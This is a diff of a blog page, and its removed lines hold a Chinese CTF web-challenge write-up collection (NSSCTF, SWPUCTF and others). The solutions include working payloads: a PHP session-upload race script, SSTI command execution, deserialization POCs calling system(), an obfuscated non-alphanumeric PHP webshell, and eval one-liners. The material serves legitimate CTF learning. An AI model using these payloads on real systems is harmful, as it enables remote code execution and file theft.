-</code></pre>
-<h1 id="GKCTF-2020-CheckIN"><a href="#GKCTF-2020-CheckIN" class="headerlink" title="[GKCTF 2020]CheckIN"></a>[GKCTF 2020]CheckIN</h1><p>Ginkgo传base64加密的payload<br>然后发现不能用<code>system</code> 看看<code>disable_functions</code><br><img src="https://img-blog.csdnimg.cn/04c33911437748b2a8c620e374c496b5.png" alt="在这里插入图片描述"><br>拿蚁剑绕<br><img src="https://img-blog.csdnimg.cn/51dbd3a264a04045ac815322c0d59b65.png" alt="在这里插入图片描述"><br>其中base64解码后是 <code>eval($_POST[1]);</code><br><img src="https://img-blog.csdnimg.cn/0eadf36f8b0749b29df08bed36b8a3a6.png" alt="在这里插入图片描述"><br>多试几个 我不知道最终成的是那个</p>
-<h1 id="SWPUCTF-2022-新生赛-ez-ez-php-revenge"><a href="#SWPUCTF-2022-新生赛-ez-ez-php-revenge" class="headerlink" title="[SWPUCTF 2022 新生赛]ez_ez_php(revenge)"></a>[SWPUCTF 2022 新生赛]ez_ez_php(revenge)</h1><p>先读flag.php<br>说在根目录<br><img src="https://img-blog.csdnimg.cn/0149137a4b6c42a68e70f661e489dd86.png" alt="在这里插入图片描述"></p>
-<h1 id="第五空间-2021-EasyCleanup"><a href="#第五空间-2021-EasyCleanup" class="headerlink" title="[第五空间 2021]EasyCleanup"></a>[第五空间 2021]EasyCleanup</h1><p>session包含 条件竞争<br>早jb忘了 有空重新看一下 这里直接用脚本了</p>
-<pre><code class="python">import io
-import requests
-from threading import Thread
-
-url = &#39;http://node4.anna.nssctf.cn:28944&#39;
-session_id = &#39;a&#39;
-
-
-def POST(session):
-    file = io.BytesIO(b&#39;a&#39; * 1024 * 5)
-    times = 0
-    while True:
-        session.post(url=url,
-                     data=&#123;
-                         &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;: &quot;&lt;?php system(&#39;cat /nssctfasdasdflag&#39;);echo md5(&#39;1&#39;);?&gt;&quot;&#125;,
-                     cookies=&#123;&#39;PHPSESSID&#39;: session_id&#125;,
-                     files=&#123;&quot;file&quot;: (&#39;a.txt&#39;, file)&#125;,
-                     )
-        print(f&#39;上传文件&#123;times&#125;&#39;)
-        times += 1
-
-
-def GET(session):
-    geturl = url + f&#39;?file=/tmp/sess_&#123;session_id&#125;&#39;
-    print(geturl)
-    while True:
-        response = session.get(url=geturl)
-        if &#39;c4ca4238a0b923820dcc509a6f75849b&#39; in response.text:
-            print(response.text)
-            break
-        else:
-            print(&#39;[+]retry-----&#39;)
-
-
-if __name__ == &#39;__main__&#39;:
-    with requests.session() as session:
-        t1 = Thread(target=POST, args=(session,))
-        t1.daemon = True
-        t1.start()
-        GET(session)
-</code></pre>
-<h1 id="HNCTF-2022-Week1-easy-upload"><a href="#HNCTF-2022-Week1-easy-upload" class="headerlink" title="[HNCTF 2022 Week1]easy_upload"></a>[HNCTF 2022 Week1]easy_upload</h1><p>直接传一句话就进去了</p>
-<p><img src="https://img-blog.csdnimg.cn/20a6155dfa7f4d93a0613c9575bf3199.png" alt="在这里插入图片描述"></p>
-<h1 id="SWPUCTF-2022-新生赛-奇妙的MD5"><a href="#SWPUCTF-2022-新生赛-奇妙的MD5" class="headerlink" title="[SWPUCTF 2022 新生赛]奇妙的MD5"></a>[SWPUCTF 2022 新生赛]奇妙的MD5</h1><p>ffifdyop<br><img src="https://img-blog.csdnimg.cn/20ecb8df280041f1b8cf1b6573f769c7.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/b2bebaadaa5b4e8b91f94a3ede2faaf8.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/faf56fc4d8f34e0b91b6556651722f5f.png" alt="在这里插入图片描述"></p>
-<h1 id="HNCTF-2022-Week1-What-is-Web"><a href="#HNCTF-2022-Week1-What-is-Web" class="headerlink" title="[HNCTF 2022 Week1]What is Web"></a>[HNCTF 2022 Week1]What is Web</h1><p><img src="https://img-blog.csdnimg.cn/1bba48f64e1d42beb7c5eae14dede115.png" alt="在这里插入图片描述"></p>
-<h1 id="NISACTF-2022-is-secret"><a href="#NISACTF-2022-is-secret" class="headerlink" title="[NISACTF 2022]is secret"></a>[NISACTF 2022]is secret<img src="https://img-blog.csdnimg.cn/51927d7ea6734b9ca35f32e8ed180b08.png" alt="在这里插入图片描述"></h1><p>RC4是对称密码 这里给key了<br><img src="https://img-blog.csdnimg.cn/c8c0e388b8744ac298d14e26144eecf2.png" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/1653c0ac0015470e9e4b32aa134e5771.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/fa710c98fab044cdb657769c60c7669c.png" alt="| 和 read 都不能用"><br><code>&#123;&#123;lipsum.__globals__.os.popen('cat /f*')['re''ad']()&#125;&#125;</code><br><img src="https://img-blog.csdnimg.cn/08fdfa58b8f143ee84531f18851d49fd.png" alt="在这里插入图片描述"></p>
-<h1 id="WUSTCTF-2020-朴实无华"><a href="#WUSTCTF-2020-朴实无华" class="headerlink" title="[WUSTCTF 2020]朴实无华"></a>[WUSTCTF 2020]朴实无华</h1><p><img src="https://img-blog.csdnimg.cn/a8dea9c2f3774028817977cf83b735ea.png" alt="在这里插入图片描述"></p>
-<h1 id="NISACTF-2022-middlerce"><a href="#NISACTF-2022-middlerce" class="headerlink" title="[NISACTF 2022]middlerce"></a>[NISACTF 2022]middlerce</h1><p><img src="https://img-blog.csdnimg.cn/a5a7e0f839324539840be82eed35fcc3.png" alt="在这里插入图片描述"><br>离谱正则 考虑绕正则回溯次数绕过</p>
-<pre><code class="lua">import requests
-payload = &#39;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?= `tail /f*`?&gt;&quot;,&quot;test&quot;:&quot;&#39; + &quot;@&quot;*(1000000) + &#39;&quot;&#125;&#39;
-res = requests.post(&quot;http://node4.anna.nssctf.cn:28625/&quot;,
-                    data=&#123;&quot;letter&quot;: payload&#125;)
-print(res.text)
-</code></pre>
-<h1 id="LitCTF-2023-Flag点击就送！"><a href="#LitCTF-2023-Flag点击就送！" class="headerlink" title="[LitCTF 2023]Flag点击就送！"></a>[LitCTF 2023]Flag点击就送！</h1><p>session伪造 key是猜的 这题没什么道理<br><img src="https://img-blog.csdnimg.cn/8ff8332a6a544bcd955d28309be06ad0.png" alt="在这里插入图片描述"></p>
-<h1 id="HNCTF-2022-Week1-Interesting-http"><a href="#HNCTF-2022-Week1-Interesting-http" class="headerlink" title="[HNCTF 2022 Week1]Interesting_http"></a>[HNCTF 2022 Week1]Interesting_http</h1><p>post 传 want&#x3D;flag<br>cookie改admin<br>XFF改本地</p>
-<h1 id="SWPUCTF-2022-新生赛-numgame"><a href="#SWPUCTF-2022-新生赛-numgame" class="headerlink" title="[SWPUCTF 2022 新生赛]numgame"></a>[SWPUCTF 2022 新生赛]numgame</h1><p><img src="https://img-blog.csdnimg.cn/7b98d874405d46c6a9663a85ce8a9b9e.png" alt="在这里插入图片描述"></p>
-<p>callUserFunc对大小写不敏感<img src="https://img-blog.csdnimg.cn/0d28c6054615425f9876074cc92c102b.png" alt="在这里插入图片描述"><br>改NSS2然后查看源码</p>
-<h1 id="NISACTF-2022-join-us"><a href="#NISACTF-2022-join-us" class="headerlink" title="[NISACTF 2022]join-us"></a>[NISACTF 2022]join-us</h1><p>登录处存在sql注入<br>database被ban了</p>
-<p>通过不存在的方法来得到数据库名<br>然后extractvalue没给ban<br><img src="https://img-blog.csdnimg.cn/b667447558124723afeee8b03bbe5b43.png" alt="在这里插入图片描述"><br>然后在查列名的时候发现column被ban了<br>题目叫join-us 很容易能想到用<code>join</code>无列名注入</p>
-<p><img src="https://img-blog.csdnimg.cn/44c2c5e46c934d0ca12f859a1f39e7cd.png" alt="在这里插入图片描述"></p>
-<h1 id="HUBUCTF-2022-新生赛-HowToGetShell"><a href="#HUBUCTF-2022-新生赛-HowToGetShell" class="headerlink" title="[HUBUCTF 2022 新生赛]HowToGetShell"></a>[HUBUCTF 2022 新生赛]HowToGetShell</h1><p><img src="https://img-blog.csdnimg.cn/faaddab264204836ae9ae54502af1bd3.png" alt="在这里插入图片描述"></p>
-<h1 id="SWPUCTF-2022-新生赛-1z-unserialize"><a href="#SWPUCTF-2022-新生赛-1z-unserialize" class="headerlink" title="[SWPUCTF 2022 新生赛]1z_unserialize"></a>[SWPUCTF 2022 新生赛]1z_unserialize</h1><pre><code class="php">&lt;?php
- 
-class lyh&#123;
-    public $lt;
-    public $lly;
-     
-     function  __destruct()
-     &#123;
-        $a = $this-&gt;lt;
-
-        $a($this-&gt;lly);
-     &#125;
-    
-    
-&#125;
-$poc = new lyh();
-$poc-&gt;lt = &quot;system&quot;;
-$poc-&gt;lly = &quot;tac /f*&quot;;
-echo serialize($poc);
-</code></pre>
-<p><code>nss=O:3:&quot;lyh&quot;:2:&#123;s:2:&quot;lt&quot;;s:6:&quot;system&quot;;s:3:&quot;lly&quot;;s:7:&quot;tac /f*&quot;;&#125;</code></p>
-<h1 id="NSSRound-4-SWPU-1zweb"><a href="#NSSRound-4-SWPU-1zweb" class="headerlink" title="[NSSRound#4 SWPU]1zweb"></a>[NSSRound#4 SWPU]1zweb</h1><p><img src="https://img-blog.csdnimg.cn/0211570563784f82b19d3636aa0949bb.png" alt="在这里插入图片描述"></p>
-<h1 id="SWPUCTF-2021-新生赛-hardrce-3"><a href="#SWPUCTF-2021-新生赛-hardrce-3" class="headerlink" title="[SWPUCTF 2021 新生赛]hardrce_3"></a>[SWPUCTF 2021 新生赛]hardrce_3</h1><p><img src="https://img-blog.csdnimg.cn/cc24c7a29711413992ce39ca1fef7dc4.png" alt="在这里插入图片描述"><br><code>$_=[];$_=@&quot;$_&quot;;$_=$_[&#39;!&#39;==&#39;@&#39;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#39;_&#39;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);</code></p>
-<p>assert($POST[_]);<br>因为是get 记得url编码<br>这里发现直接执行命令不行 通过phpinfo得知很多命令都ban了 那么还是考虑写个shell 用蚁剑绕<br><img src="https://img-blog.csdnimg.cn/b108ba97875448c78fd02205e3f366da.png" alt="在这里插入图片描述"></p>
-<h1 id="SWPUCTF-2022-新生赛-where-am-i"><a href="#SWPUCTF-2022-新生赛-where-am-i" class="headerlink" title="[SWPUCTF 2022 新生赛]where_am_i"></a>[SWPUCTF 2022 新生赛]where_am_i</h1><p>没头绪<br>看评论说是社工<br>那么应该是要电话号码<br>百度搜图得知 该地点是<code>山水间·古迹酒店</code>  <code>暑袜北一街145号</code><br><img src="https://img-blog.csdnimg.cn/dcb284d0cbaa4f6ebc235c495fe0e8b3.png" alt="在这里插入图片描述"><br>把括号删了输入就行</p>
-<p>没写明白这题为什么在WEB里</p>
-<h1 id="HNCTF-2022-WEEK2-easy-include"><a href="#HNCTF-2022-WEEK2-easy-include" class="headerlink" title="[HNCTF 2022 WEEK2]easy_include"></a>[HNCTF 2022 WEEK2]easy_include</h1><p>日志文件包含<br><img src="https://img-blog.csdnimg.cn/ec6c02b6c7f74f21b2bc1c2b42b4437b.png" alt="在这里插入图片描述"></p>
-<h1 id="SWPUCTF-2022-新生赛-ez-ez-unserialize"><a href="#SWPUCTF-2022-新生赛-ez-ez-unserialize" class="headerlink" title="[SWPUCTF 2022 新生赛]ez_ez_unserialize"></a>[SWPUCTF 2022 新生赛]ez_ez_unserialize</h1><pre><code class="php">
-&lt;?php
-class X
-&#123;
-    public $x = __FILE__;
-    function __construct($x)
-    &#123;
-        $this-&gt;x = $x;
-    &#125;
-    function __wakeup()
-    &#123;
-        if ($this-&gt;x !== __FILE__) &#123;
-            $this-&gt;x = __FILE__;
-        &#125;
-    &#125;
-    function __destruct()
-    &#123;
-        highlight_file($this-&gt;x);
-        //flag is in fllllllag.php
-    &#125;
-&#125;
-
-$p = new X(&quot;fllllllag.php&quot;);
-echo serialize($p);
-//O:1:&quot;X&quot;:1:&#123;s:1:&quot;x&quot;;s:13:&quot;fllllllag.php&quot;;&#125;
-</code></pre>
-<p>然后绕一下wakeup<br><code>O:1:&quot;X&quot;:2:&#123;s:1:&quot;x&quot;;s:13:&quot;fllllllag.php&quot;;&#125; </code><br><img src="https://img-blog.csdnimg.cn/39a5b58797a545cea1f26ba98cc14452.png" alt="在这里插入图片描述"></p>
-<h1 id="GDOUCTF-2023-反方向的钟"><a href="#GDOUCTF-2023-反方向的钟" class="headerlink" title="[GDOUCTF 2023]反方向的钟"></a>[GDOUCTF 2023]反方向的钟</h1><pre><code class="php">
-&lt;?php
-error_reporting(0);
-
-// flag.php
-class teacher
-&#123;
-    public $name;
-    public $rank;
-    private $salary;
-    public function __construct($name, $rank, $salary = 10000)
-    &#123;
-        $this-&gt;name = $name;
-        $this-&gt;rank = $rank;
-        $this-&gt;salary = $salary;
-    &#125;
-&#125;
-
-class classroom
-&#123;
-    public $name;
-    public $leader;
-    public function __construct($name, $leader)
-    &#123;
-        $this-&gt;name = $name;
-        $this-&gt;leader = $leader;
-    &#125;
-    public function hahaha()
-    &#123;
-        if ($this-&gt;name != &#39;one class&#39; or $this-&gt;leader-&gt;name != &#39;ing&#39; or $this-&gt;leader-&gt;rank != &#39;department&#39;) &#123;
-            return False;
-        &#125; else &#123;
-            return True;
-        &#125;
-    &#125;
-&#125;
-
-class school
-&#123;
-    public $department;
-    public $headmaster;
-    public function __construct($department, $ceo)
-    &#123;
-        $this-&gt;department = $department;
-        $this-&gt;headmaster = $ceo;
-    &#125;
-    public function IPO()
-    &#123;
-        if ($this-&gt;headmaster == &#39;ong&#39;) &#123;
-            echo &quot;Pretty Good ! Ctfer!\n&quot;;
-            echo new $_POST[&#39;a&#39;]($_POST[&#39;b&#39;]);
-        &#125;
-    &#125;
-    public function __wakeup()
-    &#123;
-        if ($this-&gt;department-&gt;hahaha()) &#123;
-            $this-&gt;IPO();
-        &#125;
-    &#125;
-&#125;
-$T = new teacher(&#39;ing&#39;, &#39;department&#39;);
-$C = new classroom(&quot;one class&quot;, $T,);
-$p = new school($C, &#39;ong&#39;);
-echo base64_encode(serialize($p));
-//Tzo2OiJzY2hvb2wiOjI6e3M6MTA6ImRlcGFydG1lbnQiO086OToiY2xhc3Nyb29tIjoyOntzOjQ6Im5hbWUiO3M6OToib25lIGNsYXNzIjtzOjY6ImxlYWRlciI7Tzo3OiJ0ZWFjaGVyIjozOntzOjQ6Im5hbWUiO3M6MzoiaW5nIjtzOjQ6InJhbmsiO3M6MTA6ImRlcGFydG1lbnQiO3M6MTU6IgB0ZWFjaGVyAHNhbGFyeSI7aToxMDAwMDt9fXM6MTA6ImhlYWRtYXN0ZXIiO3M6Mzoib25nIjt9
-</code></pre>
-<p>利用点是new对象 这里我们考虑new原生类<br>注意<code>SplFileObject</code>是逐行读的 所以我们要用伪协议<br><img src="https://img-blog.csdnimg.cn/b03d3fd466d54fa6b0a14153494da260.png" alt="在这里插入图片描述"></p>
-<h1 id="prize-p5"><a href="#prize-p5" class="headerlink" title="prize_p5"></a>prize_p5</h1><p>简单看了一下 应该是原生类找文件 然后用escape读<br><img src="https://img-blog.csdnimg.cn/f92b1d338ed14f6c96d37628d850cb27.png" alt="在这里插入图片描述"><br>先开个<code>GlobIterator</code>找flag</p>
-<pre><code class="php">&lt;?php
-error_reporting(0);
-
-class catalogue
-&#123;
-    public $class;
-    public $data;
-    public function __construct($class, $data)
-    &#123;
-        $this-&gt;class = $class;
-        $this-&gt;data = $data;
-    &#125;
-    public function __destruct()
-    &#123;
-        echo new $this-&gt;class($this-&gt;data);
-    &#125;
-&#125;
-
-$p = new catalogue(&quot;GlobIterator&quot;, &quot;/*flag*&quot;);
-echo serialize($p);
-//O:9:&quot;catalogue&quot;:2:&#123;s:5:&quot;class&quot;;s:12:&quot;GlobIterator&quot;;s:4:&quot;data&quot;;s:7:&quot;/*flag*&quot;;&#125;
-</code></pre>
-<p><img src="https://img-blog.csdnimg.cn/a3430eca323947a3945f41a72d23362c.png" alt="在这里插入图片描述"></p>
-<p>非预期 改16进制<br>这个点我第一次见<br>把小s改大写S 然后就可以用十六进制了<br><code>?cata=O:9:&quot;catalogue&quot;:2:&#123;s:5:&quot;class&quot;;S:13:&quot;\53\70\6c\46\69\6c\65\4f\62\6a\65\63\74&quot;;s:4:&quot;data&quot;;s:5:&quot;/flag&quot;;&#125;</code><br>预期是字符串逃逸<br><img src="https://img-blog.csdnimg.cn/36c48eb649a7445ea8340b49b9fb8b14.png" alt="在这里插入图片描述"></p>
-<h1 id="CISCN-2019初赛-Love-Math"><a href="#CISCN-2019初赛-Love-Math" class="headerlink" title="[CISCN 2019初赛]Love Math"></a>[CISCN 2019初赛]Love Math</h1><p>要尝试构造字母 base_convert()可以任意进制转换<br>36进制构造phpinfo试试<br><img src="https://img-blog.csdnimg.cn/f02fc91ee1c04c2d9735249dfc16811f.png" alt="在这里插入图片描述"></p>
-<p>然而phpinfo里没有flag<br>尝试了用system 读了一下当前目录 可以用<br>但是36进制又弄不出来空格之类的东西 读不了根目录<br>考虑到hex2bin函数 我们可以先构造hex2bin 然后就可以构造任意字符了<br>base_convert(37907361743,10,36)(dechex())<br><img src="https://img-blog.csdnimg.cn/0f6d36ac032745ee89f08a9ff64b1eef.png" alt="在这里插入图片描述"></p>
-<p>最终payload<br><code>c=\$abs=base_convert(37907361743,10,36)(dechex(1598506324));(\$\$abs)&#123;1&#125;((\$\$abs)&#123;2&#125;)&amp;1=system&amp;2=cat \f*</code></p>
-<h1 id="NCTF-2018-flask真香"><a href="#NCTF-2018-flask真香" class="headerlink" title="[NCTF 2018]flask真香"></a>[NCTF 2018]flask真香</h1><p><img src="https://img-blog.csdnimg.cn/1e21c85a08394d70b8ac06fc68f4f80e.png" alt="在这里插入图片描述"></p>
-<h1 id="SWPUCTF-2022-新生赛-xff"><a href="#SWPUCTF-2022-新生赛-xff" class="headerlink" title="[SWPUCTF 2022 新生赛]xff"></a>[SWPUCTF 2022 新生赛]xff</h1><p><img src="https://img-blog.csdnimg.cn/1c24527464e34d389cb9b6c8283ccd82.png" alt="在这里插入图片描述"></p>
-<h1 id="SWPUCTF-2022-新生赛-js-sign"><a href="#SWPUCTF-2022-新生赛-js-sign" class="headerlink" title="[SWPUCTF 2022 新生赛]js_sign"></a>[SWPUCTF 2022 新生赛]js_sign</h1><p><img src="https://img-blog.csdnimg.cn/8dd6e7a927124f4da0fe02c982ff061c.png" alt="在这里插入图片描述"><br>hint解码完是tapcode<br><img src="https://img-blog.csdnimg.cn/a20938f382fa47fdaebcd1c5976244f3.png" alt="在这里插入图片描述"><br>加括号里面转小写</p>
-<h1 id="LitCTF-2023-就当无事发生"><a href="#LitCTF-2023-就当无事发生" class="headerlink" title="[LitCTF 2023]就当无事发生"></a>[LitCTF 2023]就当无事发生</h1><p>没环境了</p>
-<h1 id="NSSRound-8-Basic-MyDoor"><a href="#NSSRound-8-Basic-MyDoor" class="headerlink" title="[NSSRound#8 Basic]MyDoor"></a>[NSSRound#8 Basic]MyDoor</h1><p>存在文件包含<br>日志文件包含给ban了<br>试试远程 也ban了<br>尝试伪协议读一下index.php</p>
-<pre><code class="php">&lt;?php
-error_reporting(0);
-
-if (isset($_GET[&#39;N_S.S&#39;])) &#123;
-    eval($_GET[&#39;N_S.S&#39;]);
-&#125;
-
-if(!isset($_GET[&#39;file&#39;])) &#123;
-    header(&#39;Location:/index.php?file=&#39;);
-&#125; else &#123;
-    $file = $_GET[&#39;file&#39;];
-
-    if (!preg_match(&#39;/\.\.|la|data|input|glob|global|var|dict|gopher|file|http|phar|localhost|\?|\*|\~|zip|7z|compress/is&#39;, $file)) &#123;
-        include $file;
-    &#125; else &#123;
-        die(&#39;error.&#39;);
-    &#125;
-&#125;
-</code></pre>
-<p><img src="https://img-blog.csdnimg.cn/de5dc5503b864ee9a44f056b81743374.png" alt="在这里插入图片描述"></p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00a596">安全</a>
-        </span>
-        
-    </div>
-    <a href="/2023/08/02/NSS%E5%88%B7web3/" class="go-post">阅读全文</a>
 </div>
 
 
@@ -2537,7 +2402,7 @@ if(!isset($_GET[&#39;file&#39;])) &#123;
     
     
     <span class="page-omit">...</span>
-    <a class="page-num" href="/page/6">6</a>
+    <a class="page-num" href="/page/7">7</a>
     
     
     <a class="page-num" href="/page/4/">
